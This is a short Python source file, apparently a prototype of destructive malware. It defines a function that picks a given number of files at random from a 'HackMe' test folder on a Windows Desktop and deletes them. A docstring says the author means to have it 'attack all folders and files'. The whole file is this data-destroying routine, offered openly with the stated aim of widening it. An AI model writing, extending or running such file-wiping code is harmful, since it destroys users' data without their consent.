import os
from random import sample

"""
For the reason testing I created a folder to delete files from, but I would have it attack all folders and files
"""

def remove_file(a):
    files = os.listdir("C:\\Users\\elsda\\Desktop\\HackMe")
    for file in sample(files, a):
        file = ("C:\\Users\\elsda\\Desktop\\HackMe\\" + str(file))
        os.remove(file)

